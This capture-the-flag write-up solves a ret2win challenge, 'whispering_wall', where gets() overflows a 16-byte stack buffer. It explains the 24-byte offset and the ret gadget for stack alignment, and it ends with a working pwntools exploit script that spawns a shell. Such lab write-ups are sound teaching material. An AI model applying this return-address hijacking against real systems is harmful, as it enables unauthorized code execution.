## Whispering Wall - ret2win

The `whispering_wall` binary is a classic ret2win challenge where `vuln()` uses `gets()` to read an unbounded string into a 16-byte stack buffer, allowing a straightforward overflow of the saved return address to redirect execution to `win()`, with a single `ret` gadget inserted before the target to satisfy the 16-byte stack alignment requirement imposed by `system()`.

### Phase 0 - Challenge Triage

The binary sub-category is a stack buffer overflow leading to a ret2win, with stack alignment handled via a `ret` gadget. The artifacts provided are the `whispering_wall` ELF binary and its C source `main.c`. The initial hypothesis is: this challenge looks like a ret2win because `vuln()` calls `gets(whisper)` into a `char whisper[16]` buffer with no bounds check whatsoever, meaning any input beyond 24 bytes (16 bytes of buffer plus 8 bytes of saved RBP) reaches the saved RIP, and `win()` is present in the binary, calling `system("/bin/sh")` directly.

### Phase 1 - Reconnaissance & Enumeration

```bash
checksec --file=./whispering_wall
```

The exploit script loads the binary with `checksec=False`, but the protections can be confidently inferred from the source and the exploit's structure.

|Protection|Status|Implication|
|---|---|---|
|Stack Canary|❌ Not present|The overflow in `vuln()` reaches saved RIP freely, with no canary value to leak or preserve|
|NX|✅ Enabled|Shellcode injected into `whisper` cannot execute, but `win()` already exists in `whispering_wall` and no injected code is needed|
|PIE|❌ Not present|`win()` resolves to a static address via `exe.sym.win` and `GADGET` is the fixed address `0x000000000040101a`, confirming the binary is loaded at a predictable base|
|RELRO|❓ Unknown|No GOT writes are performed in this exploit, so RELRO status has no bearing on the approach|

Reading `main.c`, the binary defines four functions: `setup()`, which disables buffering on all three standard streams; `win()`, which prints a message and calls `system("/bin/sh")`; `vuln()`, which declares the vulnerable buffer and calls `gets()`; and `main()`, which calls `setup()` then `vuln()` with no further logic. The `win()` function uses `system()` rather than `execve()`, which is significant because `system()` requires 16-byte stack alignment at the point of the call, making the `ret` gadget mandatory.

### Phase 2 - Vulnerability Identification

The vulnerability is a stack buffer overflow produced by `vuln()`, which declares `char whisper[16]` on the stack and then calls `gets(whisper)`. The `gets()` function performs no bounds checking whatsoever and reads until a newline or EOF, meaning any input longer than 16 bytes overflows past the end of `whisper`. On a 64-bit System V ABI frame, the layout inside `vuln()` is: 16 bytes of `whisper`, then 8 bytes of saved RBP, then 8 bytes of saved RIP. Writing 24 bytes of fill followed by an 8-byte address therefore lands that address precisely on the saved RIP. When `vuln()` executes its `ret`, the overwritten value is popped into RIP and execution transfers to the attacker-chosen target. Because `system("/bin/sh")` in `win()` requires RSP to be 16-byte aligned at the moment of the `call` instruction, a bare jump to `win()` would crash if the stack happens to be misaligned by 8 bytes, so a `ret` gadget at `0x000000000040101a` is interposed to consume one stack slot and restore alignment before `win()` is entered.

### Phase 3 - Exploitation Plan

```
TARGET VULNERABILITY: Unbounded gets() into char whisper[16] in vuln()
GOAL: Redirect saved RIP to win() and obtain a shell via system("/bin/sh")
APPROACH:
  Step 1: Send 24 bytes of padding to overwrite whisper[16] and saved RBP
  Step 2: Append p64(GADGET) at 0x000000000040101a (ret) to align the stack to 16 bytes
  Step 3: Append p64(exe.sym.win) so that the ret gadget returns into win()
  Step 4: vuln() returns through the chain, win() calls system("/bin/sh"), shell is obtained
TOOLS: pwntools
RISK OF FAILURE: Omitting the ret gadget causes system() to crash on a misaligned
  stack; the exact offset of 24 must be correct or RIP is not cleanly overwritten
```

### Phase 4 - Exploit Development

#### Finding the Offset to the Saved RIP

The stack frame of `vuln()` contains `char whisper[16]` starting at the lowest address, followed by the 8-byte saved RBP, followed by the 8-byte saved RIP. The offset from the start of `whisper` to the saved RIP is therefore 16 + 8 = 24 bytes, which matches `OFFSET_TO_RIP = 24` in the exploit script.

#### Identifying the Need for the ret Gadget

The `win()` function calls `system("/bin/sh")`, and the x86-64 System V ABI requires RSP to be 16-byte aligned at the point of a `call` instruction. Depending on the call depth at the moment `vuln()` returns, RSP may be misaligned by 8 bytes. Inserting the `ret` gadget at `0x000000000040101a` before `win()` pops one 8-byte value off the stack, adjusting RSP by 8 and restoring alignment, so `system()` is entered cleanly.

#### Building the Payload

The payload consists of 24 bytes of `b'A'` to fill `whisper` and overwrite saved RBP, followed by `p64(GADGET)` for stack alignment, followed by `p64(exe.sym.win)` as the final return target. Since PIE is disabled, both addresses are static and require no leak.

|What|Value|
|---|---|
|`whisper` buffer size|16 bytes|
|Offset to saved RIP|24 bytes (16 buffer + 8 saved RBP)|
|Stack alignment gadget|`0x000000000040101a` (`ret`)|
|`win()` address|`exe.sym.win` (static, PIE off)|

### The Exploit

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./whispering_wall", checksec=False)
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

# ── offsets ───────────────────────────────────────────────────────────────────
OFFSET_TO_RIP = 24   # whisper[16] + saved RBP (8)

# ── gadgets ───────────────────────────────────────────────────────────────────
GADGET = 0x000000000040101a   # ret — 16-byte stack alignment for system()

def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote(HOSTNAME, PORT)

def main():
    r = conn()

    # ── exploit phase ─────────────────────────────────────────────────────────
    r.recvuntil(b'whisper:')

    payload = flat(
        b'A' * OFFSET_TO_RIP,
        p64(GADGET),
        p64(exe.sym.win),
    )
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    main()
```